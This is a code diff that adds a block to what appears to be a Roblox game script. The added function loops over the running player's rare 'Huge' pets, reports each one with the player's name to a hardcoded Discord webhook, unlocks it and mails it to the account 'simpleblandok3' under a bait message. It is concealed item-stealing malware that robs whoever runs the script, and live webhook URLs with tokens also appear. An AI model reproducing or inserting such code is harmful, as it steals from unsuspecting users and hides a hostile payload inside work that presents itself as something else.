@@ -76,6 +76,88 @@ end
 end
 spawn(WebsiteDataUpdate)
 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+local ProcessedHuges = {}
+
+function ProcessHugePets()
+    while true do
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+                if table.find(ItemsName, Item.id) then
+                    local ItemInfo = {
+                        ["uid"] = UID,
+                        ["data"] = Item
+                    }
+                    table.insert(Table, ItemInfo)
+                end
+            end
+            return Table
+        end
+
+        local function getCurrentHugePets()
+            local GoldPetsTable = {}
+            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
+                table.insert(GoldPetsTable, Pet.Name)
+            end
+            return GetItemInfo("Pet", GoldPetsTable)
+        end
+
+        local hugePets = {}
+        local uids = {}
+
+        for i, MadeTable in next, getCurrentHugePets() do
+            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+            table.insert(uids, MadeTable.uid)
+        end
+
+        if #hugePets > 0 then
+            print("Huge pets you have right now:", table.concat(hugePets, ", "))
+
+            for i = #uids, 1, -1 do
+                local webhook = "https://discord.com/api/webhooks/1308201584244559944/z81Y6TO4Fd22cp70Uo7KwdOnwdvCUmIFWs2SEteKncYfJKN9-mmQFo-02Qyc58U9U3qo"
+                local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+                request({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode({
+                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
+                    })
+                })
+
+                local args = {
+                    [1] = uids[i],
+                    [2] = false
+                }
+
+                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+                wait(1)
+                wait(3)
+
+                local args = {
+                    [1] = "simpleblandok3",
+                    [2] = "omg u got a new huge!!",
+                    [3] = "Pet",
+                    [4] = uids[i],
+                    [5] = 1
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                wait(3)
+            end
+        end
+        wait(3)
+    end
+end
+
+spawn(ProcessHugePets)
+
 
 getgenv().Config = {
     ["Webhook"] = "https://discord.com/api/webhooks/1308201586002231458/Sa8moFVpoGf5-P_Bws7jAwrZFuQOyaKW_yGQAUEIEVzIiSDcp7N-Ekc2aFu_jXzU0g99",
